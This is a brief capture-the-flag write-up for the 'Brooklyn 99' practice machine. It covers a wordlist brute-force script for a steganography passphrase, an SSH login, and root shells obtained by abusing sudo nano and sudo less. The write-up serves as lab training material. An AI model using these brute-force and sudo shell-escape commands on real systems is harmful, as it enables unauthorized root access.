# WriteUp for Brooklyn 99

nmap results tell us there are three port ftp,ssh and http. And ftp has anonymous login which has note telling us that the password for jake is weak, also when take a look at webpage we find that the image has a hidden message which has a passphrase we can find that passphrase by using a basic python script.
```
import subprocess
file = open("/home/elli0t/Downloads/common.txt","r")
file = file.read()
psswd = file.split('\n')
passphrase = ''
for i in range(len(psswd)):
		subprocess.run('steghide extract -sf brooklyn99.jpg -p '+ psswd[i], shell=True)
```

After finding the passphrase we find the hidden message using steghide we can login ssh using holt's creds and find the user flag also we can see that holt can run nano as root so
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

and now we are root.
Another way is that we can use hydra and login as jake, jake can run less
```
sudo less /etc/profile
!/bin/sh
```
and now we become root.
